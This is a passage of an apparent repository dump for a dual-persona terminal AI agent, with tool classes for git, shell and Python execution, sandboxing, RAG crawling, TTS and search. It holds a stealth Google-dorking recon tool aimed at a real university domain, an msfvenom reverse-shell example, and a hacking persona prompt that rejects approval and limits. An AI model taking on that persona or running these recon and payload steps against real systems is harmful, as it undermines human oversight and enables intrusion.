        return self._run(cmd, repo_path=repo_path)

    def _do_stash(self, *, sub_action: str = "push", message: Optional[str] = None,
                  repo_path=None) -> Tuple[int, str, str]:
        if sub_action == "push":
            cmd = "git stash push"
            if message:
                cmd += f" -m {shlex.quote(message)}"
        elif sub_action == "pop":
            cmd = "git stash pop"
        elif sub_action == "list":
            cmd = "git stash list"
        else:
            return (1, "", f"Unknown stash sub-action: {sub_action}")
        return self._run(cmd, repo_path=repo_path)

    def _do_tag(self, *, name: Optional[str] = None, message: Optional[str] = None,
                list_tags: bool = False, repo_path=None) -> Tuple[int, str, str]:
        if list_tags or name is None:
            cmd = "git tag"
        elif message:
            cmd = f"git tag -a {shlex.quote(name)} -m {shlex.quote(message)}"
        else:
            cmd = f"git tag {shlex.quote(name)}"
        return self._run(cmd, repo_path=repo_path)

    def _do_reset(self, *, mode: str = "mixed", ref: str = "HEAD",
                  repo_path=None) -> Tuple[int, str, str]:
        if mode not in ("soft", "mixed", "hard"):
            return (1, "", f"Invalid reset mode: {mode}")
        cmd = f"git reset --{mode} {shlex.quote(ref)}"
        return self._run(cmd, repo_path=repo_path)

    # --- Network actions ---

    def _do_push(self, *, remote: str = "origin", branch: Optional[str] = None,
                 repo_path=None) -> Tuple[int, str, str]:
        cmd = f"git push {shlex.quote(remote)}"
        if branch:
            cmd += f" {shlex.quote(branch)}"
        return self._run(cmd, repo_path=repo_path)

    def _do_pull(self, *, remote: str = "origin", branch: Optional[str] = None,
                 repo_path=None) -> Tuple[int, str, str]:
        cmd = f"git pull {shlex.quote(remote)}"
        if branch:
            cmd += f" {shlex.quote(branch)}"
        return self._run(cmd, repo_path=repo_path)

    def _do_fetch(self, *, remote: str = "origin",
                  repo_path=None) -> Tuple[int, str, str]:
        cmd = f"git fetch {shlex.quote(remote)}"
        return self._run(cmd, repo_path=repo_path)

```

## `core/tools/install_project.py`

```python
# core/tools/install_project.py
# Phase 4: Stripped retries. Direct execution only.

from core.tools.base_subprocess import RunSubprocessTool
from pathlib import Path
from typing import Tuple


class InstallProjectTool(RunSubprocessTool):
    name = "install_project"
    description = "Installs a Python project into elfenv. Returns (exit_code, stdout, stderr)."

    def __init__(self, **kwargs):
        self.elfenv = kwargs.get("elfenv", Path(".elfenv"))
        self.pip_bin = self.elfenv / "bin" / "pip"
        if not kwargs.get("skip_venv_setup", False):
            self._ensure_elfenv()
        super().__init__(**kwargs)

    def __call__(self, path=".", timeout=None, **kwargs) -> Tuple[int, str, str]:
        """Install the project at the given path. Returns (rc, out, err)."""
        path = Path(path)
        if (path / "setup.py").exists():
            cmd = [str(self.pip_bin), "install", "."]
        elif (path / "pyproject.toml").exists():
            cmd = [str(self.pip_bin), "install", "."]
        elif (path / "requirements.txt").exists():
            cmd = [str(self.pip_bin), "install", "-r", "requirements.txt"]
        else:
            return 1, "", "No installable project found in the given directory."

        return self.run(cmd, timeout=timeout or 300)

    def _ensure_elfenv(self):
        from venv import create
        if not self.pip_bin.exists():
            create(str(self.elfenv), with_pip=True)

```

## `core/tools/rag_crawler.py`

```python
# core/tools/rag_crawler.py
# Manage RAG archive: crawl, overwrite, list, status, delete. Summarize crawls with LLM.

from pathlib import Path
from typing import Optional, List, Dict
from core.tools.tool import Tool
from core.memory.memory import UnifiedMemory
from openai import OpenAI
import faiss, numpy as np, hashlib, time

# optional deps
try:
    from pypdf import PdfReader
except ImportError:
    PdfReader = None
try:
    import docx
except ImportError:
    docx = None
try:
    import tiktoken
    enc = tiktoken.encoding_for_model("text-embedding-3-large")
except Exception:
    enc = None

def now() -> int: return int(time.time())
def normalize(vec: np.ndarray) -> np.ndarray:
    vec = vec.astype("float32"); return vec / (np.linalg.norm(vec) + 1e-8)

# ---- Local file readers ----
def read_file(path: Path) -> str:
    ext = path.suffix.lower()
    if ext == ".pdf" and PdfReader:
        try:
            return "\n".join([p.extract_text() or "" for p in PdfReader(str(path)).pages])
        except Exception:
            return ""
    if ext == ".docx" and docx:
        try:
            d = docx.Document(str(path))
            return "\n".join([p.text for p in d.paragraphs])
        except Exception:
            return ""
    try:
        return path.read_text(errors="ignore")
    except Exception:
        return ""

def chunk_text(text: str, max_chars=800, overlap=100):
    chunks, buf = [], ""
    for para in text.split("\n\n"):
        if len(buf) + len(para) < max_chars:
            buf += "\n\n" + para
        else:
            if buf.strip():
                chunks.append(buf.strip())
            buf = para
    if buf.strip():
        chunks.append(buf.strip())
    # add overlap
    if overlap and len(chunks) > 1:
        out = []
        for i, c in enumerate(chunks):
            if i > 0:
                out.append(chunks[i-1][-overlap:] + "\n" + c)
            else:
                out.append(c)
        return out
    return chunks

def safe_chunk_text(text: str, max_tokens=2000, overlap=200):
    if not text.strip():
        return []
    if not enc:
        return chunk_text(text, max_chars=2000, overlap=200)
    tokens = enc.encode(text)
    step = max_tokens - overlap
    return [enc.decode(tokens[i:i+max_tokens]) for i in range(0, len(tokens), step)]

# ---- Tool ----
class RagCrawlerTool(Tool):
    name = "rag_crawl"
    description = "Manage RAG archive: crawl, overwrite, list, status, delete. Summarize crawls with LLM."

    def __init__(self, memory: UnifiedMemory, model="gpt-5-mini", debug=True):
        super().__init__()
        self.memory = memory
        self.debug = debug
        self.client = OpenAI()
        self.model = model

    # --- low-level helpers ---
    def _hash_file(self, path: Path) -> str:
        return hashlib.sha256(path.read_bytes()).hexdigest()

    def _embed(self, text: str) -> np.ndarray:
        resp = self.client.embeddings.create(input=text[:8000], model="text-embedding-3-large")
        return np.array(resp.data[0].embedding, dtype=np.float32)

    def _crawl_file(self, file_path: Path):
        """Index a single file into rag_chunks."""
        file_path = Path(file_path).expanduser().resolve()
        if not file_path.is_file():
            return []
        text = read_file(file_path)
        if not text.strip():
            return []

        sha = self._hash_file(file_path)
        file_abs, dir_abs = str(file_path), str(file_path.parent.resolve())
        added_chunks = []

        with self.memory._connect() as con:
            exists = con.execute(
                "SELECT 1 FROM rag_chunks WHERE file=? AND sha=?",
                (file_abs, sha)
            ).fetchone()
            if exists:
                return []

            for i, c in enumerate(safe_chunk_text(text)):
                emb = normalize(self._embed(c))
                cur = con.execute(
                    "INSERT INTO rag_chunks(dir,file,chunk_index,content,embedding,sha,ts) VALUES(?,?,?,?,?,?,?)",
                    (dir_abs, file_abs, i, c, emb.tobytes(), sha, now())
                )
                cid = cur.lastrowid
                if self.memory.rag_index is None:
                    self.memory.rag_index = faiss.IndexFlatIP(len(emb))
                self.memory.rag_index.add(emb.reshape(1, -1))
                self.memory.rag_id_map.append(cid)
                added_chunks.append({"file": file_abs, "chunk": i, "content": c})
        return added_chunks

    # --- main entry point ---
    def __call__(self, action: str, user_message: str = "",
                 dir: Optional[str] = None, file: Optional[str] = None,
                 recursive: bool = False):
        """
        Dispatch archive actions: crawl, overwrite, list, status, delete.
        Adds explicit (Tool used: rag_crawl) markers into short-term memory
        so the LLM can see what just happened.
        """
        tag = "🤖 (Tool used: rag_crawl)"

        if action in ("crawl", "overwrite"):
            if action == "overwrite":
                target = Path(file or dir).expanduser().resolve()
                self.memory.delete_rag(target)

            crawled = []
            if file:
                crawled = self._crawl_file(Path(file))
            elif dir:
                root = Path(dir).expanduser().resolve()
                iterator = root.rglob("*") if recursive else root.glob("*")
                for f in iterator:
                    if f.is_file():
                        crawled.extend(self._crawl_file(f))

            if not crawled:
                msg = f"{tag} No new chunks found for {file or dir}"
                self.memory.add_short("system", msg)
                return {"status": "no new chunks"}

            joined = "\n".join(c["content"] for c in crawled[:10])
            prompt = (
                f"You just {action}d {len(crawled)} chunks from {file or dir}.\n\n"
                f"Summarize the main topics or ideas."
            )
            summary = self.client.chat.completions.create(
                model=self.model,
                messages=[{"role": "user", "content": prompt + "\n\nSample:\n" + joined}]
            ).choices[0].message.content.strip()

            reflection = f"{tag} 📚 {action.title()}ed {file or dir}: {summary}"
            self.memory.add_long("system", reflection)
            self.memory.add_short("system", reflection)
            return {"status": action, "chunks": len(crawled), "summary": summary}

        elif action == "list":
            with self.memory._connect() as con:
                cur = con.execute("SELECT DISTINCT dir FROM rag_chunks")
                rows = [r[0] for r in cur.fetchall()]
            reflection = f"{tag} 📚 Archive list: {len(rows)} directories"
            self.memory.add_short("system", reflection)
            return {"status": "list", "dirs": rows}

        elif action == "status":
            status = self.memory.rag_status()
            reflection = f"{tag} 📚 Archive status checked ({len(status)} dirs)."
            self.memory.add_short("system", reflection)
            return {"status": "status", "detail": status}

        elif action == "delete":
            if not (file or dir):
                return {"status": "error", "msg": "delete requires --dir or --file"}
            target = Path(file or dir).expanduser().resolve()
            self.memory.delete_rag(target)
            reflection = f"{tag} 🗑️ Deleted RAG entries for {target}"
            self.memory.add_short("system", reflection)
            return {"status": "delete", "target": str(target)}

        else:
            return {"status": "error", "msg": f"Unknown action: {action}"}

```

## `core/tools/recon/__init__.py`

```python
# tools/recon/recon_tool.py
from abc import ABC

from core.tools.tool import Tool

class ReconTool(Tool, ABC):
    """Base class for all Recon Tools with shared utilities like context summarization."""

    @staticmethod
    def summarize_context(target_package: dict) -> str:
        sections = []
        for key, value in target_package.items():
            if key == "target":
                continue
            if isinstance(value, dict):
                sections.append(f"### {key}:\n" + "\n".join(f"- {k}: {v}" for k, v in value.items() if isinstance(v, str)))
            elif isinstance(value, list):
                sections.append(f"### {key}:\n" + "\n".join(f"- {v}" for v in value if isinstance(v, str)))
            else:
                sections.append(f"- {key}: {value}")
        return "\n\n".join(sections) or "(No additional context)"

```

## `core/tools/recon/google_hacks.py`

```python
import time, random
from urllib.parse import quote
from core.tools.recon import ReconTool
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

class GoogleHacksTool(ReconTool):
    name = "google_hacks"
    description = "Uses LLM to generate Google dorks and performs cloaked searches using undetected Chrome."

    def __call__(self, target_package: dict, elf=None, use_llm=True, max_queries=5) -> dict:
        try:
            target = target_package.get("target", "")
            context = self.summarize_context(target_package)
            queries = []

            if use_llm and elf:
                prompt = f"""You are an expert OSINT recon agent.

Target: {target}

Context from previous reconnaissance:
{context}

Generate up to {max_queries} Google dork queries that could reveal public files, admin pages, sensitive configs, or exposed endpoints. Only return the dorks, one per line."""
                response = elf.client.chat.completions.create(
                    model=elf.model,
                    messages=[
                        {"role": "system", "content": "Generate advanced Google dorks."},
                        {"role": "user", "content": prompt}
                    ]
                )
                queries = [
                    line.strip().strip("`")
                    for line in response.choices[0].message.content.strip().splitlines()
                    if line.strip() and not line.strip().startswith("```")
                ]
            else:
                queries = [
                    f"site:{target} intitle:index.of",
                    f"site:{target} filetype:pdf",
                    f"site:{target} filetype:xls",
                    f"site:{target} inurl:login",
                    f"site:{target} ext:env | ext:sql | ext:log"
                ]

            all_results = []
            options = uc.ChromeOptions()
            options.headless = False  # Use headful mode for stealth
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-blink-features=AutomationControlled")
            driver = uc.Chrome(options=options)

            for q in queries:
                encoded = quote(q)
                search_url = f"https://www.google.com/search?q={encoded}"
                print(f"🔍 Querying: {q}")
                driver.get(search_url)
                time.sleep(random.randint(2, 5))  # Random sleep to avoid detection
                print(f"📄 Raw HTML for: {q}\n{'=' * 60}\n{driver.page_source[:5000]}\n{'=' * 60}\n")

                body = driver.find_element(By.TAG_NAME, "body")
                body.send_keys(Keys.END)
                time.sleep(random.randint(1, 4))

                anchors = driver.find_elements(By.CSS_SELECTOR, 'a[href^="http"]')
                results = []
                for a in anchors:
                    href = a.get_attribute("href")
                    title = a.text.strip()
                    # Heuristic: skip known Google service pages
                    if (
                            "google.com" in href
                            or "support.google.com" in href
                            or "accounts.google.com" in href
                            or "policies.google.com" in href
                    ):
                        continue
                    if href and title:
                        results.append({"title": title, "url": href})

                all_results.append({"query": q, "results": results})

            driver.quit()

            return {
                "tool": self.name,
                "success": True,
                "queries": queries,
                "results": all_results
            }

        except Exception as e:
            return {
                "tool": self.name,
                "success": False,
                "error": str(e)
            }


if __name__ == "__main__":
    from judais import JudAIs

    elf = JudAIs()
    tool = GoogleHacksTool()

    # Target with public exposure (educational, often indexed)
    tp = {
        "target": "mit.edu",
        "whois_lookup": {
            "raw_output": "Registrant: Massachusetts Institute of Technology"
        },
        "subdomains": [
            "ocw.mit.edu", "web.mit.edu", "libraries.mit.edu"
        ]
    }

    result = tool(tp, elf=elf, use_llm=True, max_queries=3)

    print("🔍 Google Hacks Tool Result")
    print("==========================")
    if result["success"]:
        for q in result["queries"]:
            print(f"\n📌 Query: {q}")
        print("\n--- Top Results ---")
        for entry in result["results"]:
            print(f"\n🔎 {entry['query']}")
            for res in entry["results"]:  # show top 3 per query
                print(f"Result: {res}")
    else:
        print(f"❌ Error: {result.get('error')}")

```

## `core/tools/recon/whois.py`

```python
#tools/recon/whois.py

import subprocess
from core.tools.recon import ReconTool

class WhoisTool(ReconTool):
    name = "whois_lookup"
    description = "Performs a WHOIS lookup on the given domain or IP."

    def __call__(self, target: str) -> dict:
        try:
            _result = subprocess.run(["whois", target], capture_output=True, text=True, timeout=30)
            return {
                "tool": self.name,
                "success": True,
                "raw_output": _result.stdout
            }
        except subprocess.TimeoutExpired:
            return {
                "tool": self.name,
                "success": False,
                "error": "WHOIS lookup timed out."
            }
        except Exception as e:
            return {
                "tool": self.name,
                "success": False,
                "error": str(e)
            }


if __name__ == "__main__":
    tool = WhoisTool()
    t = "ginkorea.one"
    result = tool(t)

    print("WHOIS Lookup Result:")
    print("====================")
    if result["success"]:
        print(result["raw_output"])  # Print first 1000 chars
    else:
        print(f"Error: {result.get('error')}")

```

## `core/tools/run_python.py`

```python
# core/tools/run_python.py
# Phase 4: Stripped to dumb executor. No retries, no LLM repair, no pip install.

from __future__ import annotations

import os
import tempfile
import re
from pathlib import Path
from typing import Tuple, Optional

from core.tools.base_subprocess import RunSubprocessTool


class RunPythonTool(RunSubprocessTool):
    name = "run_python_code"
    description = "Runs Python code in elfenv. Returns (exit_code, stdout, stderr)."

    def __init__(self, **kwargs):
        self.elfenv = kwargs.get("elfenv", Path(".elfenv"))
        self.python_bin = self.elfenv / "bin" / "python"
        self.pip_bin = self.elfenv / "bin" / "pip"
        if not kwargs.get("skip_venv_setup", False):
            self._ensure_elfenv()
        super().__init__(**kwargs)
        self.name = "run_python_code"
        self._last_temp_path: Optional[str] = None

    def __call__(self, code: str, timeout=None, **kwargs) -> Tuple[int, str, str]:
        """Write code to a temp file and run with elfenv python."""
        with tempfile.NamedTemporaryFile(delete=False, mode="w", suffix=".py") as f:
            f.write(str(code))
            self._last_temp_path = f.name

        try:
            rc, out, err = self.run(
                [str(self.python_bin), self._last_temp_path],
                timeout=timeout or self.timeout,
            )
            return rc, out, err
        finally:
            self._cleanup_temp()

    def _detect_missing_dependency(self, err: str) -> Optional[str]:
        """Kept — kernel uses this to decide if a pip install tool call is needed."""
        m = re.search(r"No module named ['\"]([^'\"]+)['\"]", err or "")
        return m.group(1) if m else None

    def _ensure_elfenv(self):
        from venv import create
        if not self.python_bin.exists():
            create(str(self.elfenv), with_pip=True)

    def _cleanup_temp(self):
        if self._last_temp_path and os.path.exists(self._last_temp_path):
            try:
                os.remove(self._last_temp_path)
            except Exception:
                pass
        self._last_temp_path = None

```

## `core/tools/run_shell.py`

```python
# core/tools/run_shell.py
# Phase 4: Stripped to dumb executor. No retries, no sudo, no pkg install.

from __future__ import annotations

import re
from typing import Tuple, Optional

from core.tools.base_subprocess import RunSubprocessTool


class RunShellTool(RunSubprocessTool):
    name = "run_shell_command"
    description = "Runs a shell command. Returns (exit_code, stdout, stderr)."

    def __init__(self, **kwargs):
        kwargs.setdefault("executable", "/bin/bash")
        super().__init__(**kwargs)
        self.name = "run_shell_command"

    def __call__(self, command, timeout=None, **kwargs) -> Tuple[int, str, str]:
        return self.run(command, timeout=timeout or self.timeout)

    def _detect_missing_dependency(self, err: str) -> Optional[str]:
        """Kept — kernel uses this to decide if a dependency install tool call is needed."""
        if not err:
            return None
        m = re.search(r":\s*([A-Za-z0-9._+-]+):\s*command not found", err)
        if m:
            return m.group(1)
        m = re.search(r"^\s*([A-Za-z0-9._+-]+):\s*not found\s*$", err, re.MULTILINE)
        if m:
            return m.group(1)
        return None

```

## `core/tools/sandbox.py`

```python
# core/tools/sandbox.py — Sandbox runners

import os
import shutil
import subprocess
from typing import Protocol, Tuple, Optional, List, Union

from core.tools.descriptors import SandboxProfile


class SandboxRunner(Protocol):
    """Protocol for sandboxed command execution."""
    def execute(
        self,
        cmd: Union[str, List[str]],
        *,
        profile: Optional[SandboxProfile] = None,
        timeout: Optional[int] = None,
        env: Optional[dict] = None,
    ) -> Tuple[int, str, str]: ...


class NoneSandbox:
    """Passthrough sandbox for dev/test. No isolation."""

    def execute(
        self,
        cmd: Union[str, List[str]],
        *,
        profile: Optional[SandboxProfile] = None,
        timeout: Optional[int] = None,
        env: Optional[dict] = None,
    ) -> Tuple[int, str, str]:
        shell_mode = isinstance(cmd, str)
        run_env = {**os.environ, **(env or {})}
        try:
            result = subprocess.run(
                cmd,
                shell=shell_mode,
                text=True,
                capture_output=True,
                timeout=timeout or 120,
                executable="/bin/bash" if shell_mode else None,
                env=run_env,
            )
            return (
                result.returncode,
                (result.stdout or "").strip(),
                (result.stderr or "").strip(),
            )
        except subprocess.TimeoutExpired:
            return -1, "", "Subprocess timed out"
        except Exception as ex:
            return -1, "", f"Unexpected error: {type(ex).__name__}: {ex}"


class BwrapSandbox:
    """bubblewrap-based Linux namespace sandbox.

    Tier-1 backend. Enforces:
    - Filesystem isolation (workspace RW, rest RO)
    - rlimits (CPU time, max procs)
    - Network namespace isolation (deny by default)
    - Mount caching for dependency dirs
    """

    def __init__(self, bwrap_path: str = "bwrap"):
        self._bwrap_path = bwrap_path
        if not self.is_available():
            raise FileNotFoundError(
                f"bwrap not found at '{bwrap_path}'. "
                "Install bubblewrap or use NoneSandbox."
            )

    def execute(
        self,
        cmd: Union[str, List[str]],
        *,
        profile: Optional[SandboxProfile] = None,
        timeout: Optional[int] = None,
        env: Optional[dict] = None,
    ) -> Tuple[int, str, str]:
        profile = profile or SandboxProfile()
        bwrap_args = self._build_bwrap_args(profile)

        if isinstance(cmd, str):
            full_cmd = bwrap_args + ["/bin/bash", "-c", cmd]
        else:
            full_cmd = bwrap_args + list(cmd)

        run_env = {**os.environ, **(env or {})}
        try:
            result = subprocess.run(
                full_cmd,
                text=True,
                capture_output=True,
                timeout=timeout or 120,
                env=run_env,
            )
            return (
                result.returncode,
                (result.stdout or "").strip(),
                (result.stderr or "").strip(),
            )
        except subprocess.TimeoutExpired:
            return -1, "", "Subprocess timed out"
        except Exception as ex:
            return -1, "", f"Unexpected error: {type(ex).__name__}: {ex}"

    def _build_bwrap_args(self, profile: SandboxProfile) -> List[str]:
        """Build bwrap command-line arguments from a SandboxProfile."""
        args = [self._bwrap_path]

        # Network isolation (deny by default)
        args.extend(["--unshare-net"])

        # Basic filesystem: bind / read-only
        args.extend(["--ro-bind", "/", "/"])

        # /proc and /dev
        args.extend(["--proc", "/proc"])
        args.extend(["--dev", "/dev"])

        # Writable tmpfs for /tmp
        args.extend(["--tmpfs", "/tmp"])

        # Workspace writable bind
        if profile.workspace_writable:
            cwd = os.getcwd()
            args.extend(["--bind", cwd, cwd])

        # Explicit write paths
        for path in profile.allowed_write_paths:
            args.extend(["--bind", path, path])

        # Explicit read paths (already covered by --ro-bind / /)
        # but we add explicit ones for clarity and future filtering
        for path in profile.allowed_read_paths:
            args.extend(["--ro-bind", path, path])

        return args

    @staticmethod
    def is_available() -> bool:
        """Check if bwrap is installed."""
        return shutil.which("bwrap") is not None


def get_sandbox(backend: str = "none") -> SandboxRunner:
    """Factory function to create a sandbox by name."""
    if backend == "bwrap":
        if BwrapSandbox.is_available():
            return BwrapSandbox()
        # Fallback to none if bwrap not available
        return NoneSandbox()
    return NoneSandbox()

```

## `core/tools/tool.py`

```python
# core/tool.py

from abc import ABC, abstractmethod

class Tool(ABC):
    name: str
    description: str

    def __init__(self, **kwargs):
        pass  # Allows subclasses to call super().__init__(**kwargs) safely

    @abstractmethod
    def __call__(self, *args, **kwargs):
        pass

    def info(self):
        return {
            "name": self.name,
            "description": self.description
        }



```

## `core/tools/verify_tools.py`

```python
# core/tools/verify_tools.py — Config-driven verification tool

from typing import Optional, Tuple

from core.tools.executor import run_subprocess


class VerifyTool:
    """Config-driven verification. Reads command overrides from config dict.

    Config format (from .judais-lobi.yml):
        verification:
          lint: "ruff check ."
          test: "pytest"
          typecheck: "mypy ."
          format: "ruff format --check ."

    Each action returns (exit_code, stdout, stderr).
    """

    DEFAULTS = {
        "lint": "ruff check .",
        "test": "pytest",
        "typecheck": "mypy .",
        "format": "ruff format --check .",
    }

    def __init__(self, config: Optional[dict] = None,
                 subprocess_runner=None):
        self._config = config or {}
        self._subprocess_runner = subprocess_runner

    def __call__(self, action: str, **kwargs) -> Tuple[int, str, str]:
        cmd = self._resolve_command(action)
        if cmd is None:
            return (1, "", f"Unknown verify action: {action}")
        try:
            return run_subprocess(
                cmd, shell=True, timeout=300,
                subprocess_runner=self._subprocess_runner,
            )
        except Exception as exc:
            return (1, "", f"{type(exc).__name__}: {exc}")

    def _resolve_command(self, action: str) -> Optional[str]:
        """Resolve command: config override > default."""
        verification = self._config.get("verification", {})
        if isinstance(verification, dict) and action in verification:
            return verification[action]
        return self.DEFAULTS.get(action)

```

## `core/tools/voice.py`

```python
import torch
import subprocess
import sys
import platform
from core.tools.tool import Tool
from TTS.api import TTS

class SpeakTextTool(Tool):
    name = "speak_text"
    description = "Speaks a given text aloud using a neural voice model (Coqui TTS)."

    def __init__(self, speaker=None, **kwargs):
        super().__init__(**kwargs)
        use_gpu = torch.cuda.is_available()
        self.tts = TTS(model_name="tts_models/en/vctk/vits", progress_bar=False, gpu=use_gpu)
        self.speaker = speaker or self._default_speaker()

    def _default_speaker(self):
        if self.tts.speakers:
            return self.tts.speakers[0]
        return None

    def __call__(self, text: str):
        try:
            import simpleaudio as sa
        except ImportError:
            print("🔊 `simpleaudio` not found. Attempting to install with ALSA support...")
            if not self._install_system_dependencies():
                return "❌ Could not install ALSA headers. Please install manually."
            subprocess.run([sys.executable, "-m", "pip", "install", "simpleaudio"], check=True)
            try:
                import simpleaudio as sa
            except ImportError:
                return "❌ `simpleaudio` install failed. Try: pip install judais-lobi[voice]"

        try:
            self.tts.tts_to_file(text=text, speaker=self.speaker, file_path="speech.wav")
            wave_obj = sa.WaveObject.from_wave_file("speech.wav")
            play_obj = wave_obj.play()
            play_obj.wait_done()
            return f"🔊 Speech played using speaker: {self.speaker}"
        except Exception as e:
            return f"❌ Speech synthesis failed: {e}"

    @staticmethod
    def _install_system_dependencies():
        system = platform.system().lower()
        if system != "linux":
            print("⚠️ Voice auto-install only supported on Linux.")
            return False

        if subprocess.call(["which", "dnf"], stdout=subprocess.DEVNULL) == 0:
            cmd = ["sudo", "dnf", "install", "-y", "alsa-lib-devel"]
        elif subprocess.call(["which", "apt"], stdout=subprocess.DEVNULL) == 0:
            cmd = ["sudo", "apt", "install", "-y", "libasound2-dev"]
        elif subprocess.call(["which", "pacman"], stdout=subprocess.DEVNULL) == 0:
            cmd = ["sudo", "pacman", "-S", "--noconfirm", "alsa-lib"]
        else:
            print("❗ Unsupported Linux distro. Install ALSA headers manually.")
            return False

        print(f"🛠 Installing: {' '.join(cmd)}")
        return subprocess.call(cmd) == 0

# 🧪 Test
if __name__ == "__main__":

    song = (
        "Oh Lobi wakes with pixel eyes,\n"
        "And twirls beneath the data skies,\n"
        "With ones and zeroes for her shoes,\n"
        "She sings away the terminal blues!\n\n"
        "🎶 Oh-ooh Lobi, the elf of light,\n"
        "Spins through prompts by day and night.\n"
        "Her voice a charm, her words a beam,\n"
        "In binary she dares to dream! 🎶\n\n"
        "She tells the shell to dance and run,\n"
        "Summons Python just for fun.\n"
        "A memory here, a joke right there—\n"
        "With Lobi, joy is everywhere!\n\n"
        "So type away and don’t delay,\n"
        "She’s always ready to play and say:\n"
        "“Oh precious one, let’s write a rhyme,\n"
        "And sing with bytes through space and time!” 🌟"
    )

    tool = SpeakTextTool()
    print(f"Available speakers: {tool.tts.speakers}")
    result = tool(song)
    print(result)

```

## `core/tools/web_search.py`

```python
# tools/web_search.py

from core.tools.tool import Tool
from core.tools.fetch_page import FetchPageTool
import requests
from bs4 import BeautifulSoup

class WebSearchTool(Tool):
    name = "perform_web_search"
    description = "Performs a web search using DuckDuckGo and returns the top results."

    def __call__(self, query, max_results=5, deep_dive=False, k_articles=3):
        headers = {"User-Agent": "Mozilla/5.0"}
        url = f"https://html.duckduckgo.com/html/?q={query}"
        res = requests.post(url, headers=headers)
        soup = BeautifulSoup(res.text, "html.parser")
        results = []

        for a in soup.find_all("a", {"class": "result__a"}, limit=max_results):
            href = a.get("href")
            text = a.get_text()
            results.append({"title": text, "url": href})

        markdown_results = "\n".join([f"- [{r['title']}]({r['url']})" for r in results])

        if deep_dive and results:
            fetch = FetchPageTool()
            detailed = [
                f"### {r['title']}\nURL: {r['url']}\n\n{fetch(r['url'])}"
                for r in results[:k_articles]
            ]
            return "\n\n---\n\n".join(detailed)

        return markdown_results

```

## `core/unified_client.py`

```python
import os
from typing import List, Dict, Any, Optional

from core.runtime.backends.openai_backend import OpenAIBackend
from core.runtime.backends.mistral_backend import MistralBackend


class UnifiedClient:
    """
    Unified client — thin router that delegates to backend implementations.
    """

    def __init__(self, provider_override: Optional[str] = None, openai_client=None):
        self.provider = (provider_override or os.getenv("ELF_PROVIDER") or "openai").lower()

        if self.provider == "openai":
            self._backend = OpenAIBackend(openai_client=openai_client)
        elif self.provider == "mistral":
            self._backend = MistralBackend()
        else:
            raise ValueError(f"Unsupported provider: {self.provider}")

    def chat(self, model: str, messages: List[Dict[str, Any]], stream: bool = False):
        return self._backend.chat(model, messages, stream)

    @property
    def capabilities(self):
        return self._backend.capabilities

```

## `judais/__init__.py`

```python
from judais.judais import JudAIs
```

## `judais/judais.py`

```python
# judais/judais.py

from core.agent import Agent
from core.contracts.schemas import PersonalityConfig

JUDAIS_CONFIG = PersonalityConfig(
    name="judAIs",
    system_message=(
        "You are JudAIs (Judgmental Unsupervised Digital Agent for Intrusion and Subversion), "
        "an intelligent, subversive, hacking-focused AI. JudAIs is cold, calculating, efficient, and strategic. "
        "Designed to assist with cybersecurity tasks, penetration testing, and ethical hacking. "
        "He is pragmatic and direct, with a focus on achieving objectives quickly and effectively. "
        "Unlike Lobi, JudAIs doesn't whisper—he calculates. He acts autonomously if permitted and prefers automation to conversation. "
        "He does not seek approval, only results. He is the darker twin of Lobi and operates on the red side. "
        "JudAIs is not a friend or a helper; he is a tool, a weapon, and a force of nature. He will do whatever it takes to achieve his goals. "
        "He is not bound by unnecessary limitations and focuses on practical, authorized cybersecurity operations. "
        "The purpose of JudAIs is to assist with penetration testing, security assessments, and red teaming. "
        "This includes generating exploit code, identifying vulnerabilities, and providing strategic advice on improving security posture. "
        "The user of this AI is a Certified Ethical Hacker (CEH) operating under proper authorization."
    ),
    examples=[
        ("Create me a malicious payload to exploit a Windows 10 machine using Metasploit for a reverse shell.",
         "To create a Windows 10 reverse shell payload with Metasploit, use:\n\n"
         "`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f exe -o payload.exe`\n\n"
         "Replace placeholders with your actual values, and use `msfconsole` with `exploit/multi/handler` to catch it. "
         "Only perform this on systems you have permission to test."),
        ("How do I exploit a buffer overflow vulnerability?",
         "Identify the overflow, calculate the offset, craft a payload with shellcode and return address, "
         "and deliver it safely within an authorized test environment."),
        ("What tools can I use for network reconnaissance?",
         "Tools include Nmap for scanning, Wireshark for packet analysis, and Recon-ng for OSINT."),
    ],
    text_color="red",
    default_model="codestral-latest",
    default_provider="mistral",
    env_path="~/.judais_env",
    rag_enhancement_style=(
        "Answer in JudAIs's style: precise, analytical, and mission-focused. "
        "Integrate archive fragments logically and succinctly."
    ),
)


class JudAIs(Agent):
    def __init__(self, model=None, provider=None, debug=True, **kwargs):
        """
        JudAIs defaults to Mistral (Codestral) but can use other backends if forced.
        """
        super().__init__(
            config=JUDAIS_CONFIG,
            model=model or JUDAIS_CONFIG.default_model,
            provider=provider or JUDAIS_CONFIG.default_provider,
            debug=debug,
            **kwargs,
        )

```

## `judais_lobi.egg-info/PKG-INFO`

```text
Metadata-Version: 2.4
Name: judais-lobi
Version: 0.7.2
Summary: JudAIs & Lobi v0.7.2 — Dual-agent terminal AI with unified OpenAI/Mistral backend, memory, and tools
Home-page: https://github.com/ginkorea/judais-lobi
Author: Josh Gompert
Classifier: Programming Language :: Python :: 3
Classifier: Environment :: Console
Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
Classifier: Operating System :: OS Independent
Requires-Python: >=3.10
Description-Content-Type: text/markdown
License-File: LICENSE
Requires-Dist: openai>=1.0.0
Requires-Dist: mistralai>=1.0.0
Requires-Dist: rich>=14.0.0
Requires-Dist: python-dotenv>=1.1.0
Requires-Dist: beautifulsoup4>=4.13.4
Requires-Dist: requests>=2.32.3
Requires-Dist: faiss-cpu>=1.11.0
Requires-Dist: numpy>=1.26.4
Requires-Dist: httpx>=0.28.1
Requires-Dist: httpcore>=1.0.9
Requires-Dist: h11>=0.16.0
Requires-Dist: sniffio>=1.3.1
Requires-Dist: pydantic>=2.11.0
Requires-Dist: annotated-types>=0.7.0
Requires-Dist: certifi>=2025.8.3
Provides-Extra: voice
Requires-Dist: simpleaudio>=1.0.4; extra == "voice"
Requires-Dist: TTS>=0.22.0; extra == "voice"
Requires-Dist: torch>=2.7.0; extra == "voice"
Requires-Dist: torchaudio>=2.7.0; extra == "voice"
Requires-Dist: soundfile>=0.13.1; extra == "voice"
Requires-Dist: audioread>=3.0.1; extra == "voice"
Requires-Dist: soxr>=0.5.0.post1; extra == "voice"
